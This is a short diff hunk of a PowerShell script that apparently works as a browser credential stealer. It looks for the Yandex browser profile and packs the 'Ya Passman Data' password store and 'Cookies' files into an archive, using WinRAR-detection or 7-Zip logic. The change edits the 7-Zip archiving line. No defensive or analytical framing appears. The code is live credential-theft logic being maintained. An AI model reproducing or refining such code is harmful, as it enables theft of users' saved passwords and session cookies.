@@ -34,7 +34,7 @@ if(Test-Path -Path $y){
   if("WinRAR" -in $arh)
     {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
   elseif("7-Zip"-in $arh)
-    {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}
+    {.\7z.exe a $p ($y+"Ya Passman Data") -spf -tzip | .\7z.exe a $p ($y+"Cookies") -spf -tzip}
   echo "Yqwe"
 }
 else{echo "Yasd"}
